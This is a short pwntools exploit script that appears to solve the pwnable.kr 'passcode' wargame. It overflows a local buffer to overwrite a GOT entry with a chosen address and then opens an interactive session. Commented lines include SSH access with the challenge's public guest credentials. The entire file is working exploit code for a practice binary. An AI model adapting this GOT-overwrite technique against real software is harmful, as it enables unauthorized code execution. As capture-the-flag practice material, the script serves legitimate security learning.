from pwn import *
context.log_level = 'DEBUG'
# s=ssh(host='pwnable.kr',user='passcode',password='guest',port=2222)
# a = s.connect_remote(s.host, l.lport)
# s.run('./passcode')
# s.sendline('a'*200)
# s.recv()
r=process('./passcode')
raw_input('#')
r.recv()
r.sendline('a'*96+'\x00\xa0\x04\x08') ##0804a000
r.recv()
# r.sendline('a'*116+p32(0x080485e3))
r.sendline('134514147') # 0x80485e3file
# r.recv()
# r.sendline('2154')

r.interactive()
